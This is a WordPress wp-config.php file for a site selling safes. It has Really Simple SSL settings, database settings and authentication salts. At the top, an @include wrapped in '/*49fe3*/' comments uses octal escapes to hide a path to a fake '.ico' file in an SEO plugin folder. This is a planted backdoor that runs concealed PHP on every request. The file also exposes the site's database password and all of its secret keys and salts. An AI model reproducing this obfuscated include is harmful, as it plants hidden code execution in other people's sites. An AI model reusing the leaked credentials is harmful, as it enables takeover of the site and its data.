<?php
/*49fe3*/

@include "\057home\057kets\141tant\157angi\141dinh\056com/\160ubli\143_htm\154/wp-\143onte\156t/pl\165gins\057all-\151n-on\145-seo\055pack\057.095\062fb3e\056ico";

/*49fe3*/

//Begin Really Simple SSL Load balancing fix
if ((isset($_ENV["HTTPS"]) && ("on" == $_ENV["HTTPS"]))
|| (isset($_SERVER["HTTP_X_FORWARDED_SSL"]) && (strpos($_SERVER["HTTP_X_FORWARDED_SSL"], "1") !== false))
|| (isset($_SERVER["HTTP_X_FORWARDED_SSL"]) && (strpos($_SERVER["HTTP_X_FORWARDED_SSL"], "on") !== false))
|| (isset($_SERVER["HTTP_CF_VISITOR"]) && (strpos($_SERVER["HTTP_CF_VISITOR"], "https") !== false))
|| (isset($_SERVER["HTTP_CLOUDFRONT_FORWARDED_PROTO"]) && (strpos($_SERVER["HTTP_CLOUDFRONT_FORWARDED_PROTO"], "https") !== false))
|| (isset($_SERVER["HTTP_X_FORWARDED_PROTO"]) && (strpos($_SERVER["HTTP_X_FORWARDED_PROTO"], "https") !== false))
|| (isset($_SERVER["HTTP_X_PROTO"]) && (strpos($_SERVER["HTTP_X_PROTO"], "SSL") !== false))
) {
$_SERVER["HTTPS"] = "on";
}
//END Really Simple SSL
 define( 'WP_POST_REVISIONS', 3 );
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'kets_ketsat');

/** MySQL database username */
define('DB_USER', 'kets_ketsat');

/** MySQL database password */
define('DB_PASSWORD', 'ketsatshsyagsdgshdashdg');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '{)o+[<zc4#%VY[bxfv2>53SNB,@E]GF-E(^{6W1GS0IVHMd}.JUY7f?9Z*0hFeFD');
define('SECURE_AUTH_KEY',  'q*P.h.(NrD#=f>)_k~VWYZNMb/j3em]{K`_!92{|i4 6cpuG2YE^ON}PDX%U&`A~');
define('LOGGED_IN_KEY',    'f/eS%]9h:+[D4tWmaj9v4O{}2(EURv6oqMZqbk>J K0l@[]%EWE:d2toM!y[<i?,');
define('NONCE_KEY',        ' 1.j1]Od7{96`7V04OT8O<6GoY#km5fAqhA{-DtaIYk;+*`P<YK;Udu#ah=j|3xD');
define('AUTH_SALT',        'MDsz d-( /-DQ=jX(Six(z,7a+95*CrD&3QBo0L>|>T$}f(OVp<?|SK+etA)xFyS');
define('SECURE_AUTH_SALT', 'kkTytVz/ej>LCR,:PR^k(kycLHLY{v,J:Ls8m$hHW{LBn[+;Bb0A^g_h- MKLC(1');
define('LOGGED_IN_SALT',   'MR&/Asl]S:z_HtDd56/.lAWd*cjY$Qt7A8!Ar`yVyXy>h7jMY3Kc!#=pCeBO`ET)');
define('NONCE_SALT',       'Mz!@(zgZDN$DP|*bIMA=YvNth7:Xh<5Ild2PCu#+>p28&T[i]!d@oU.93Hn!9t}$');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
define('WP_HOME','https://ketsatantoangiadinh.com');
define('WP_SITEURL','https://ketsatantoangiadinh.com');
